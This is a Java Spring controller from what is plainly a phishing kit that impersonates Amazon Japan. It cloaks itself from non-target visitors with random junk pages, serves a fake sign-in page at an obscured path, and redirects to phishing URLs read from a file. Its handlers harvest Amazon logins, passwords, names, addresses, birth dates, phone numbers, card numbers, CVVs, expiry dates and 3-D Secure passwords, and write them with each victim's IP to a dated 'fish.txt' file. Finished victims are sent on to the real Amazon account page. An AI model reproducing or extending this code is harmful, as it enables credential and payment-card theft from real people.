package com.kidd.testfishing1.web;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.util.RandomUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.kidd.testfishing1.service.AuthUserService;
import com.kidd.testfishing1.service.CacheService;
import com.kidd.testfishing1.task.AsyncTask;
import com.kidd.testfishing1.common.IpUtils;
import com.kidd.testfishing1.model.FraudUserInfoForm;
import com.kidd.testfishing1.model.UserInfoForm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.nio.charset.Charset;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.*;
import java.util.stream.Collectors;


@Controller
public class AmazonController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;

    @Autowired
    private AuthUserService authUserService;

    @Autowired
    private CacheService cacheService;

    private void randStr(Model model) {
        String random = RandomUtil.randomString(3000);
        String header = RandomUtil.randomString(20);
        model.addAttribute("data", random);
        model.addAttribute("header", header);
    }

    @GetMapping("/testTemplate")
    public Object index(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al, Model model) {
        randStr(model);
        return "test";
    }

    @GetMapping("/redirect")
    public Object redirect(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al, Model model) {
        try {
            boolean result = authUserService.auth(request);
            if (!result) {
                randStr(model);
                return "test";
            }
        } catch (Exception e) {

        }
        List<String> phishingUrls = FileUtil.readLines("/www/phishingUrl.txt", Charset.defaultCharset());
        Integer size = phishingUrls.size();
        String url = phishingUrls.get(RandomUtil.randomInt(0,size));
        return "redirect:"+url;
    }

    @GetMapping("/9d6667652ea246a7a82fcd4764a206a6")
    public Object signin(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al, Model model) {
        try {
            //是否尝试再次进入
            String ip = IpUtils.getIpAddress(request);
            Object enterFlag = cacheService.getCommonCache(ip+"end");
            if(enterFlag!=null && enterFlag.equals(1)){
                return "redirect:https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya";
            }
            boolean result = authUserService.auth(request);
            if (!result) {
                randStr(model);
                return "test";
            }
        } catch (Exception e) {

        }
        return "login";
    }

    @PostMapping("/kiddSigin")
    @ResponseBody
    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent, @RequestHeader("Accept-Language") String al, Model model) {
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd HH:mm:ss");
        UserInfoForm form = UserInfoForm.builder()
                .email(form1.getKiddfiled1())
                .emailPwd(form1.getKiddfiled2())
                .al(al)
                .dateTime(timeStr)
                .build();
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        form.setUserAgent(agent);
        asyncSaveUserInfo(form);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }

    @GetMapping("/warn")
    public Object warning(@RequestHeader("Accept-Language") String al, Model model) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        return "warning";
    }

    @GetMapping("/user-bill")
    public Object billing(@RequestHeader("Accept-Language") String al, Model model) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        return "billing";
    }

    @PostMapping("/kiddbilling")
    @ResponseBody
    public Object billing3(UserInfoForm form, @RequestHeader("Accept-Language") String al, Model model) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        asyncSaveUserInfo(form);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }


    @GetMapping("/user-validate")
    @ResponseBody
    public Object validate(@RequestHeader("Accept-Language") String al, Model model) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        return true;
    }

    @GetMapping("/user-verified")
    public Object verifiedby(UserInfoForm form, Model model, @RequestHeader("Accept-Language") String al) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
        model.addAttribute("dateTime", timeStr);
        model.addAttribute("cardNo", form.getCxdi().substring(form.getCxdi().length() - 4, form.getCxdi().length()));
        model.addAttribute("cardName", form.getNameCard());
        return "verified";
    }

    @PostMapping("/verified")
    @ResponseBody
    public Object verifiedby2(UserInfoForm form, @RequestHeader("Accept-Language") String al, Model model) {
        boolean result = authUserService.auth(request);
        if (!result) {
            randStr(model);
            return "test";
        }
        asyncSaveUserInfo(form);

        //标识已完成，不准再次进入
        String ip = IpUtils.getIpAddress(request);
        cacheService.setCommonCache(ip+"end",1);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }

    @GetMapping("/zipcode")
    @ResponseBody
    public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
        String jstr = "";
        try {
            Map parm = new HashMap<String, String>();
            parm.put("zipcode", zipCode);
            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .form(parm)//表单内容
                    .timeout(20000)//超时，毫秒
                    .execute().body();
            JSONObject jobj = JSONUtil.parseObj(result);
            jstr = JSONUtil.toJsonStr(jobj);
        } catch (Exception e) {
            HashMap<String, Object> map = new HashMap<>();
            map.put("status", 500);
            map.put("message", null);
            map.put("results", null);
            jstr = JSONUtil.toJsonStr(map);
        }
        return jstr;
    }

    private List<String> appendIp(List<String> infos) {
        String ip = IpUtils.getIpAddress(request);
        infos = infos.stream().map(u -> u = String.format("%s # %s", ip, u)).collect(Collectors.toList());
        return infos;
    }

    private void asyncSaveUserInfo(UserInfoForm form) {
        List<String> contents = appendIp(convertInfo2List(form));
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyyMMdd");
        asyncTask.asyncWriteList(String.format("/root/%s/fish.txt", timeStr), contents);
    }

    private List<String> convertInfo2List(UserInfoForm userInfo) {
        List<String> list = new ArrayList<>();
        list.add(concatInfo("DateTime", userInfo.getDateTime()));
        list.add(concatInfo("Al", userInfo.getAl()));
        list.add(concatInfo("AmazonId", userInfo.getEmail()));
        list.add(concatInfo("AmazomPwd", userInfo.getEmailPwd()));
        list.add(concatInfo("UserAgent", userInfo.getUserAgent()));
        list.add(concatInfo("CountryCode", userInfo.getCountryCode()));
        list.add(concatInfo("FullName", userInfo.getEnterAddressFullName()));
        if (!(StringUtils.isEmpty(userInfo.getEnterAddressPostalCodeOne()) && StringUtils.isEmpty(userInfo.getEnterAddressPostalCodeTwo()))) {
            list.add(concatInfo("PostalCode", userInfo.getEnterAddressPostalCodeOne() + userInfo.getEnterAddressPostalCodeTwo()));
        }
        list.add(concatInfo("StateOrRegion", userInfo.getEnterAddressStateOrRegion()));
        if (!(StringUtils.isEmpty(userInfo.getBirth_day()) && StringUtils.isEmpty(userInfo.getBirth_day()) && StringUtils.isEmpty(userInfo.getBirth_day()))) {
            list.add(concatInfo("BirthDay", String.format("%s/%s/%s", userInfo.getBirth_year(), userInfo.getBirth_month(), userInfo.getBirth_day())));
        }
        list.add(concatInfo("AddressLine1", userInfo.getEnterAddressLine1()));
        list.add(concatInfo("AddressLine2", userInfo.getEnterAddressLine2()));
        list.add(concatInfo("AddressLine3", userInfo.getEnterAddressLine3()));
        list.add(concatInfo("PhoneNumber", userInfo.getEnterAddressPhoneNumber()));
        list.add(concatInfo("CardName", userInfo.getNameCard()));
        list.add(concatInfo("CardNo", userInfo.getCxdi()));
        list.add(concatInfo("CVV", userInfo.getCsc()));
        if (!(StringUtils.isEmpty(userInfo.getYear()) && StringUtils.isEmpty(userInfo.getMonth()))) {
            list.add(concatInfo("Expire", String.format("%s/%s", userInfo.getYear(), userInfo.getMonth())));
        }
        list.add(concatInfo("3dSecret", userInfo.getPassword_vbv()));
        list.removeAll(Collections.singleton(null));
        return list;
    }

    private String concatInfo(String key, String value) {
        if (StringUtils.isEmpty(value)) {
            return null;
        }
        return String.format("%s : %s", key, value);
    }

    @GetMapping("/testIp")
    @ResponseBody
    public Object testIp(@RequestParam(value = "ip") String ip, @RequestParam(value = "al") String al) {
        boolean result = authUserService.auth(al, ip, "");
        return result;
    }
}
